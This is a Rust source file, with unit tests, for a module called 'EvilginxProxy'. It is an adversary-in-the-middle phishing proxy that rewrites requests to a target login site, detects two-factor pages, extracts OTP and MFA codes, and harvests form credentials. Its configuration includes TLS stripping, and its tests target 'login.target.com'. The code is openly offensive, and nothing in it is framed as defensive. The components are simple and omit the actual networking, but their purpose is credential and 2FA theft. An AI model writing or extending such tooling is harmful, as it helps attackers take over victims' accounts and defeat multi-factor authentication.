use std::collections::HashMap;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ProxyCapture {
    pub timestamp: String,
    pub method: String,
    pub path: String,
    pub host: String,
    pub headers: HashMap<String, String>,
    pub body: String,
    pub cookies: HashMap<String, String>,
    pub has_2fa: bool,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ProxyConfig {
    pub listen_addr: String,
    pub listen_port: u16,
    pub target_url: String,
    pub capture_post: bool,
    pub strip_tls: bool,
    pub log_file: Option<String>,
}

pub struct EvilginxProxy;

impl Default for EvilginxProxy {
    fn default() -> Self {
        Self::new()
    }
}

impl EvilginxProxy {
    pub fn new() -> Self {
        EvilginxProxy
    }

    pub fn format_config(config: &ProxyConfig) -> String {
        format!(
            "Evilginx Proxy Configuration\n\
             Listen: {}:{}\n\
             Target: {}\n\
             Capture POST: {}\n\
             Strip TLS: {}\n\
             Log: {}\n",
            config.listen_addr,
            config.listen_port,
            config.target_url,
            if config.capture_post { "yes" } else { "no" },
            if config.strip_tls { "yes" } else { "no" },
            config.log_file.as_deref().unwrap_or("none")
        )
    }

    pub fn proxy_request(
        method: &str,
        path: &str,
        host: &str,
        headers: &HashMap<String, String>,
        body: &str,
        _target_url: &str,
    ) -> String {
        let mut proxy_headers = HashMap::new();
        for (k, v) in headers {
            let lower = k.to_lowercase();
            if lower != "host" && lower != "content-length" && lower != "connection" {
                proxy_headers.insert(k.clone(), v.clone());
            }
        }
        proxy_headers.insert("Host".to_string(), host.to_string());
        proxy_headers.insert("X-Forwarded-For".to_string(), "127.0.0.1".to_string());
        proxy_headers.insert("X-Forwarded-Host".to_string(), host.to_string());

        let mut req = format!("{} {} HTTP/1.1\r\n", method, path);
        for (k, v) in &proxy_headers {
            req.push_str(&format!("{}: {}\r\n", k, v));
        }
        if !body.is_empty() {
            req.push_str(&format!("Content-Length: {}\r\n", body.len()));
            req.push_str("\r\n");
            req.push_str(body);
        } else {
            req.push_str("\r\n");
        }
        req
    }

    pub fn extract_tokens(body: &str) -> Vec<String> {
        let mut tokens = Vec::new();
        let patterns = ["token", "code", "otp", "mfa", "2fa", "totp", "authenticator",
            "verification", "sms", "security_code", "passcode", "pin"];

        let lower = body.to_lowercase();
        for pattern in &patterns {
            let mut search_pos = 0;
            while let Some(pos) = lower[search_pos..].find(pattern) {
                let abs = search_pos + pos;
                let start = abs.saturating_sub(20);
                let end = (abs + pattern.len() + 30).min(lower.len());
                let context = &body[start..end];
                tokens.push(context.to_string());
                search_pos = abs + 1;
            }
        }
        tokens
    }

    pub fn detect_2fa_page(html: &str) -> bool {
        let lower = html.to_lowercase();
        let indicators = [
            "two-factor", "2-factor", "2fa", "mfa", "otp", "authenticator",
            "verification code", "security code", "enter the code",
            "multi-factor", "sms code", "passcode", "totp",
        ];
        indicators.iter().any(|i| lower.contains(i))
    }

    pub fn capture_credentials(body: &str) -> HashMap<String, String> {
        let mut creds = HashMap::new();
        let re = regex::Regex::new(r#"<input[^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["']"#).ok();

        if let Some(re) = re {
            for cap in re.captures_iter(body) {
                let name = cap[1].to_string();
                let value = cap[2].to_string();
                if !value.is_empty() {
                    creds.insert(name, value);
                }
            }
        }

        if creds.is_empty() && body.contains('=') {
            let parts: Vec<&str> = body.split('&').collect();
            for part in parts {
                if let Some((k, v)) = part.split_once('=') {
                    creds.insert(
                        url_decode(k).unwrap_or_default(),
                        url_decode(v).unwrap_or_default(),
                    );
                }
            }
        }
        creds
    }
}

fn url_decode(s: &str) -> Result<String, String> {
    let mut bytes = Vec::new();
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '%' {
            let hex: String = chars.by_ref().take(2).collect();
            if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                bytes.push(byte);
            }
        } else if c == '+' {
            bytes.push(b' ');
        } else {
            let mut buf = [0u8; 4];
            bytes.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
        }
    }
    String::from_utf8(bytes).map_err(|e| format!("utf8 decode: {}", e))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_config() {
        let config = ProxyConfig {
            listen_addr: "0.0.0.0".to_string(),
            listen_port: 443,
            target_url: "https://login.target.com".to_string(),
            capture_post: true,
            strip_tls: true,
            log_file: None,
        };
        let formatted = EvilginxProxy::format_config(&config);
        assert!(formatted.contains("0.0.0.0:443"));
        assert!(formatted.contains("login.target.com"));
    }

    #[test]
    fn test_proxy_request() {
        let mut headers = HashMap::new();
        headers.insert("User-Agent".to_string(), "Mozilla".to_string());
        headers.insert("Cookie".to_string(), "session=abc".to_string());
        let req = EvilginxProxy::proxy_request("POST", "/login", "target.com", &headers, "user=admin&pass=secret", "https://target.com");
        assert!(req.contains("POST /login HTTP/1.1"));
        assert!(req.contains("X-Forwarded-For"));
    }

    #[test]
    fn test_detect_2fa() {
        let html = "<html><form><input name=\"otp\"></form></html>";
        assert!(EvilginxProxy::detect_2fa_page(html));

        let html2 = "<html>no auth here</html>";
        assert!(!EvilginxProxy::detect_2fa_page(html2));
    }

    #[test]
    fn test_extract_tokens() {
        let body = "verification code: 123456 and token=abc";
        let tokens = EvilginxProxy::extract_tokens(body);
        assert!(!tokens.is_empty());
    }

    #[test]
    fn test_capture_credentials() {
        let body = "user=admin&pass=secret123&token=abc";
        let creds = EvilginxProxy::capture_credentials(body);
        assert!(!creds.is_empty());
    }

    #[test]
    fn test_proxy_capture() {
        let capture = ProxyCapture {
            timestamp: "now".to_string(),
            method: "POST".to_string(),
            path: "/login".to_string(),
            host: "target.com".to_string(),
            headers: HashMap::new(),
            body: "password=secret".to_string(),
            cookies: HashMap::new(),
            has_2fa: false,
        };
        let json = serde_json::to_string_pretty(&capture).unwrap();
        assert!(json.contains("target.com"));
    }
}
